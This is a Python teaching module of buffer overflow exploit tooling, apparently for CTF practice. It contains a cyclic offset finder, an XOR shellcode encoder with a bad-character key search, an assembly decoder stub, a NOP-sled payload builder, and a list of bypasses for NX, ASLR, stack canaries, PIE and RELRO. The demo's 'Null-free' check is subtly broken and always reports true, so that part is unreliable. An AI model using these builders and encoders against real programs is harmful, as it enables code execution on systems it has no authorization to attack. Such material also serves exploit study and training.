"""
Example: Buffer Overflow
=========================
Cyclic pattern generator, shellcode XOR encoder, payload builder,
and exploit mitigation detector.

IMPORTANT: For authorized security testing and CTF only.
"""

import struct
import string


# ---------------------------------------------------------------------------
# Cyclic Pattern Generator (De Bruijn-like)
# ---------------------------------------------------------------------------

def cyclic_pattern(length: int) -> bytes:
    """Generate a cyclic pattern for offset calculation."""
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
    pattern = bytearray()
    for a in charset[:26]:  # uppercase
        for b in charset[26:52]:  # lowercase
            for c in charset[52:]:  # digits
                if len(pattern) >= length:
                    return bytes(pattern[:length])
                pattern.extend(f"{a}{b}{c}".encode())
    return bytes(pattern[:length])


def find_offset(pattern: bytes, value: bytes) -> int:
    """Find the offset of a 4-byte value in the pattern."""
    idx = pattern.find(value)
    return idx if idx >= 0 else -1


# ---------------------------------------------------------------------------
# Shellcode XOR Encoder
# ---------------------------------------------------------------------------

def xor_encode(shellcode: bytes, key: int) -> bytes:
    """XOR-encode shellcode with a single-byte key."""
    return bytes(b ^ key for b in shellcode)


def find_safe_xor_key(shellcode: bytes, bad_chars: bytes = b"\x00") -> int:
    """Find an XOR key that avoids producing bad characters."""
    for key in range(1, 256):
        encoded = xor_encode(shellcode, key)
        if not any(b in bad_chars for b in encoded):
            if key not in bad_chars:
                return key
    return -1


def xor_decoder_stub(key: int) -> str:
    """Generate pseudo-assembly for XOR decoder stub."""
    return f"""; XOR Decoder Stub (key=0x{key:02x})
    jmp short get_shellcode
decoder:
    pop esi              ; ESI = shellcode address
    xor ecx, ecx
    mov cl, SHELLCODE_LEN
decode_loop:
    xor byte [esi], 0x{key:02x}
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decoder
shellcode:
    ; encoded shellcode follows"""


# ---------------------------------------------------------------------------
# Payload Builder
# ---------------------------------------------------------------------------

def build_payload(buffer_size: int, ret_offset: int,
                  ret_addr: int, shellcode: bytes,
                  nop: bytes = b"\x90") -> bytes:
    """Build a stack buffer overflow payload."""
    if len(shellcode) > buffer_size:
        raise ValueError("Shellcode larger than buffer")

    nop_sled_size = buffer_size - len(shellcode)
    payload = nop * nop_sled_size + shellcode

    # Pad to return address offset
    padding_needed = ret_offset - len(payload)
    if padding_needed > 0:
        payload += b"B" * padding_needed

    # Append return address (little-endian, 64-bit)
    payload += struct.pack("<Q", ret_addr)
    return payload


# ---------------------------------------------------------------------------
# Exploit Mitigation Summary
# ---------------------------------------------------------------------------

MITIGATIONS = {
    "NX/DEP": {
        "description": "Non-Executable stack prevents shellcode execution on stack",
        "bypass": ["Return-Oriented Programming (ROP)", "ret2libc",
                    "JIT spraying"],
    },
    "ASLR": {
        "description": "Randomizes memory layout on each execution",
        "bypass": ["Information leak", "Brute force (32-bit)",
                    "Return-to-PLT", "Partial overwrite"],
    },
    "Stack Canary": {
        "description": "Random value between locals and saved RBP",
        "bypass": ["Format string leak", "Brute force (fork servers)",
                    "Overwrite specific variables without touching canary"],
    },
    "PIE": {
        "description": "Position-Independent Executable randomizes .text base",
        "bypass": ["Information leak of code address", "Partial overwrite"],
    },
    "RELRO": {
        "description": "Marks GOT as read-only after relocation",
        "bypass": ["Partial RELRO: overwrite GOT entries",
                    "Full RELRO: target other writable areas"],
    },
}


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def demo():
    print("Buffer Overflow Examples")
    print("=" * 50)

    # Cyclic pattern
    pattern = cyclic_pattern(100)
    print(f"\nCyclic Pattern (100 bytes): {pattern[:50]}...")
    target = pattern[44:48]
    offset = find_offset(pattern, target)
    print(f"  Offset of {target!r} = {offset}")

    # XOR encoder
    shellcode = b"\x48\x31\xc0\x50\x48\x89\xe7\x00\x00\x48\xc7\xc0\x3b"
    print(f"\nOriginal shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
    key = find_safe_xor_key(shellcode)
    encoded = xor_encode(shellcode, key)
    print(f"  XOR key: 0x{key:02x}")
    print(f"  Encoded: {encoded.hex()}")
    print(f"  Null-free: {'\\x00' not in encoded.hex()}")

    # Payload builder
    payload = build_payload(
        buffer_size=64, ret_offset=72,
        ret_addr=0x7FFFFFFFE100,
        shellcode=b"\xCC" * 20,  # INT3 breakpoints
    )
    print(f"\nPayload ({len(payload)} bytes):")
    print(f"  NOP sled: {payload[:10].hex()}...")
    print(f"  Return addr: {payload[-8:].hex()}")

    # Mitigations
    print("\nExploit Mitigations:")
    for name, info in MITIGATIONS.items():
        print(f"  {name}: {info['description']}")
        print(f"    Bypasses: {', '.join(info['bypass'][:2])}")


if __name__ == "__main__":
    demo()
